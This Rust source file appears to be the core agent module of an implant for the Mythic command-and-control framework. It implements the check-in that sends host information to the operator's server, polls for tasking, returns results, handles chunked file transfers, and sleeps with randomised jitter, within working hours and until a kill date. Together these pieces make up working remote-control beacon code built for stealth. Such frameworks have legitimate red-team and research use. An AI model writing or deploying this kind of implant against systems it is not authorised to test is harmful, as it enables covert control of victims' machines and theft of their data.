use crate::payloadvars;
use crate::tasking::Tasker;
use chrono::prelude::{DateTime, NaiveDate};
use chrono::{Local, NaiveDateTime, NaiveTime, TimeDelta};
use rand::Rng;
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::error::Error;

use crate::profiles::Profile;

#[cfg(target_os = "linux")]
use crate::utils::linux as native;

#[cfg(target_os = "windows")]
use crate::utils::windows as native;

/// Struct containing the pending task information
#[derive(Debug, Deserialize, Serialize)]
pub struct AgentTask {
    /// The command for the task
    pub command: String,

    /// The parameters of the task (can either contain a raw string or JSON)
    pub parameters: String,

    /// Timestamp of the task
    pub timestamp: f64,

    /// Task id for tracking
    pub id: String,
}

/// Response when grabbing new tasks from Mythic
#[derive(Debug, Deserialize, Serialize)]
pub struct GetTaskingResponse {
    /// List of pending tasks
    pub tasks: Vec<AgentTask>,
}

/// Struct used for sending the completed task information
#[derive(Debug, Deserialize, Serialize)]
pub struct PostTaskingResponse {
    /// Action for the post request
    pub action: String,

    /// List of completed tasking
    pub responses: Vec<serde_json::Value>,
}

/// Used for holding any data which has to be passed along to a background task
#[derive(Debug, Deserialize, Serialize)]
pub struct ContinuedData {
    /// Id of the task
    pub task_id: String,

    /// Status returned from Mythic
    pub status: String,

    /// Whether an error occured or not
    pub error: Option<String>,

    /// File id if downloading a file
    pub file_id: Option<String>,

    /// Total chunks if downloading/uploading a file
    pub total_chunks: Option<u32>,

    /// Current chunk being processed for download/upload tasks
    pub chunk_num: Option<u32>,

    /// The chunk data for download/upload tasks
    pub chunk_data: Option<String>,
}

/// Data which is shared between the agent thread and worker thread
pub struct SharedData {
    /// Sleep interval of the agent
    pub sleep_interval: u64,

    /// Jitter of the agent
    pub jitter: u64,

    /// Flag for signifying that the agent should exit
    pub exit_agent: bool,

    /// Start time of the configured working hours
    pub working_start: NaiveTime,

    /// End time of the configured working hours
    pub working_end: NaiveTime,
}

/// Main agent struct containing information with regards to C2 communication
pub struct Agent {
    /// Data shared between the agent and worker threads
    pub shared: SharedData,

    /// Configured C2 profile
    c2profile: Profile,

    /// Agent kill date
    killdate: NaiveDate,

    /// Tasking information for the agent
    pub tasking: Tasker,
}

impl Agent {
    /// Creates a new `Agent` object
    pub fn new() -> Self {
        let c2profile = Profile::new(payloadvars::payload_uuid());

        // Return a new `Agent` object
        Self {
            shared: SharedData {
                jitter: payloadvars::callback_jitter(),
                sleep_interval: payloadvars::callback_interval(),
                exit_agent: false,
                working_start: payloadvars::working_start(),
                working_end: payloadvars::working_end(),
            },
            c2profile,
            tasking: Tasker::new(),
            killdate: NaiveDate::parse_from_str(&payloadvars::killdate(), "%Y-%m-%d").unwrap(),
        }
    }

    /// Makes the inital C2 checkin
    pub fn make_checkin(&mut self) -> Result<(), Box<dyn Error>> {
        // Get the checkin information depending on OS
        let json_body = native::get_checkin_info();

        // Send the checkin information through the configured profile
        self.c2profile.initial_checkin(&json_body)?;

        Ok(())
    }

    /// Gets new tasking from Mythic
    pub fn get_tasking(&mut self) -> Result<Option<Vec<AgentTask>>, Box<dyn Error>> {
        // Create the body for receiving new tasking
        let json_body = json!({
            "action": "get_tasking",
            "tasking_size": -1,
        })
        .to_string();

        // Send the data through the C2 profile to Mythic
        let body = self.c2profile.send_data(&json_body)?;

        // Deserialize the response into a struct
        let response: GetTaskingResponse = serde_json::from_str(&body)?;

        // Return a success and any tasking
        if !response.tasks.is_empty() {
            Ok(Some(response.tasks))
        } else {
            Ok(None)
        }
    }

    /// Sends completed tasking to Mythic
    /// * `completed` - Slice of completed tasks
    pub fn send_tasking(
        &mut self,
        completed: &[serde_json::Value],
    ) -> Result<Option<Vec<AgentTask>>, Box<dyn Error>> {
        // Create the request body with the completed tasking information
        let body = PostTaskingResponse {
            action: "post_response".to_string(),
            responses: completed.to_owned(),
        };

        let req_payload = serde_json::to_string(&body)?;

        // Send the completed task data
        let json_response = self.c2profile.send_data(&req_payload)?;

        // Deserialize the response into a struct
        let response: PostTaskingResponse = serde_json::from_str(&json_response)?;

        // Some background tasks require more information from Mythic in order to continue
        // running (upload/download). Take the response and create new tasking for passing along to
        // already running background tasks
        let mut pending_tasks: Vec<AgentTask> = Vec::new();
        for resp in response.responses {
            let completed_data: ContinuedData = serde_json::from_value(resp)?;

            pending_tasks.push(AgentTask {
                command: "continued_task".to_string(),
                parameters: serde_json::to_string(&completed_data)?,
                timestamp: 0.0,
                id: completed_data.task_id,
            });
        }

        // If there are messages that need to be passed to background tasks, return them.
        if !pending_tasks.is_empty() {
            Ok(Some(pending_tasks))
        } else {
            Ok(None)
        }
    }

    /// Sleep the agent for the specified interval and jitter or sleep the agent
    /// if not in the working hours time frame
    pub fn sleep(&mut self) {
        // Check the killdate
        let now: DateTime<Local> = std::time::SystemTime::now().into();
        let now: NaiveDateTime = now.naive_local();

        // Signal that the agent should exit if it has reached the kill date
        if now.date() >= self.killdate {
            self.shared.exit_agent = true;
        }

        // Grab the sleep interval and jitter from the `Agent` struct
        let jitter = self.shared.jitter;
        let interval = self.shared.sleep_interval;

        // Calculate the sleep time using the interval and jitter
        let sleep_time = calculate_sleep_time(interval, jitter);

        // Sleep the agent
        std::thread::sleep(std::time::Duration::from_secs(sleep_time));

        // Get the working hours start time from the shared data.
        let working_start = NaiveDateTime::new(now.date(), self.shared.working_start);

        // Get the working hours end time from the shared data.
        let working_end = NaiveDateTime::new(now.date(), self.shared.working_end);

        // Check if the working hours are equal to eachother and assume that this
        // means the agent should have a 24 hours active time
        if working_end != working_start {
            let mut sleep_time = std::time::Duration::from_secs(0);

            if now < working_start {
                // Calculate the sleep interval if the current time is before
                // the working hours
                let delta = TimeDelta::try_seconds(
                    working_start.and_utc().timestamp() - now.and_utc().timestamp(),
                )
                .unwrap_or_default();
                sleep_time = delta.to_std().unwrap();
            } else if now > working_end {
                // Calculate the sleep interval if the current time as after the
                // working hours
                let next_start = working_start
                    .checked_add_signed(TimeDelta::try_days(1).unwrap())
                    .unwrap();

                let delta = TimeDelta::try_seconds(
                    next_start.and_utc().timestamp() - now.and_utc().timestamp(),
                )
                .unwrap_or_default();
                sleep_time = delta.to_std().unwrap();
            }

            std::thread::sleep(sleep_time);
        }
    }
}

/// Calculate the desired sleep time based on the interval and jitter
/// * `interval` - Interval in seconds to sleep
/// * `jitter` - Sleep jitter value between 0-100
pub fn calculate_sleep_time(interval: u64, jitter: u64) -> u64 {
    // Convert the jitter to a random percentage value from 0 to the max jitter value
    let jitter = (rand::thread_rng().gen_range(0..jitter + 1) as f64) / 100.0;

    // Set the actual sleep time by randomly adding or subtracting the jitter from the
    // agent sleep time
    if (rand::random::<u8>()) % 2 == 1 {
        interval + (interval as f64 * jitter) as u64
    } else {
        interval - (interval as f64 * jitter) as u64
    }
}
